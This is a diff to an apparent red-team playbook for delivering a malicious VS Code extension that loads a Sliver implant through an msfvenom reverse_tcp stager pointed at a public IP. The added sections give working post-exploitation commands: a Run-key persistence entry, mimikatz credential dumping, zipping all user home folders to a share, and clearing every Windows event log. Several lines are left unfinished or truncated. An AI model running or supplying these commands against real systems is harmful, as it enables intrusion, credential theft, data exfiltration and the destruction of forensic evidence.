@@ -80,7 +80,7 @@ Use `msfvenom` to generate a raw stager that connects back to Sliver's stage lis
 
 ```bash
 msfvenom --payload windows/x64/custom/reverse_tcp \
-  LHOST=192.168.1.126 \
+  LHOST=210.210.210.110 \
   LPORT=1234 \
   LURI=/hello.woff \
   --format raw \
@@ -94,9 +94,11 @@ msfvenom --payload windows/x64/custom/reverse_tcp \
 Create a new Sliver profile and start the stage listener:
 
 ```bash
-profiles new --mtls 192.168.1.126 --format shellcode local
+profiles new --mtls 210.210.210.110 --format shellcode local
 
-stage-listener --url tcp://192.168.122.1:1234 --profile local --prepend-size
+stage-listener --url tcp://210.210.210.110:443 --profile local --prepend-size
+
+mtls
 ```
 
 > **Note:** Ensure the LHOST/LPORT in `msfvenom` matches the `stage-listener` address.
@@ -140,3 +142,50 @@ code --install-extension <ExtensionName>.vsix
 - [ ] Python server is running and reachable from target
 - [ ] Sliver stage listener is active before extension executes
 - [ ] VSIX installed on target machine
+
+## Follow On Actions
+
+Sliver: Load extensions onto target: 
+```bash
+#Sliver Prompt:
+Armory install all --proxy http://10.10.0.100:8080
+
+```
+
+## Priv ESC:
+
+If UAC bypasss is required use this: 
+
+
+## Persitance:
+
+Add the VSIX file to the Admins extension folder then put VSCODE on Startup
+
+```Powershell
+$src='C:\Users\Dewey.Houston\.vscode\extensions'; $dest='C:\Users\Administrator\.vscode\extensions'; if(!(Test-Path $dest)){New-Item $dest -ItemType Directory -Force}; Copy-Item "$src\*" $dest -Recurse -Force
+#Change Dewey Houston
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VSCode" -Value '"C:\Program Files\Microsoft VS Code\Code.exe"'
+#Check if VSCode is on system profile
+```
+
+## Follow on Actions
+remove VSIX File
+```Powershell
+remove-item C:\<Path to 
+
+enumerate shares with sliver and run mimikatz in sliver:
+```bash
+sa-netuse-list
+mimikatz privilege::debug
+mimikatz sekurlsa::logonpasswords
+```
+
+copy users home directory to a zip file and 
+```Powershell
+Compress-Archive -Path "C:\Users" -DestinationPath "\\NetShare\Used
+```
+Clear Event View Logs
+
+```Powershell
+for /f in %x in ('wevtutil el') do wevtutil cl "%x"
+```
